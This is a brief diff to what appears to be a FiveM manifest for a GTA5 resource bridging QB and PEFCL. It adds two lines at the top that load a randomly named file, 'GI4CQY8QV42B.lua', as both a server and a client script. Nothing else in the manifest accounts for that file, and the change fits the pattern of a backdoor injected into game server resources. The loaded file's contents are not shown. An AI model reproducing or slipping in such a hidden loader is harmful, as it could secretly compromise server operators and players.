@@ -1,3 +1,5 @@
+server_script "GI4CQY8QV42B.lua"
+client_script "GI4CQY8QV42B.lua"
 fx_version 'cerulean'
 game 'gta5'
 description 'Bridge for QB to PEFCL'
